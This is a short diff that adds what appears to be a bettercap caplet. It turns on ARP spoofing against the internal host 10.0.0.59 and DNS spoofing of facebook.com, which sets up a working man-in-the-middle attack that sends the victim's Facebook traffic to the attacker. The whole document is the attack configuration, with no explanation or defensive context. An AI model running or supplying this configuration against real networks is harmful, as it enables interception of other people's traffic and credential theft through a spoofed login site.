@@ -1,0 +1,6 @@
+#ARP spoofing
+set arp.spoof.targets 10.0.0.59
+arp.spoof on
+#dns spoofing
+set dns.spoof.domains facebook.com
+dns.spoof on
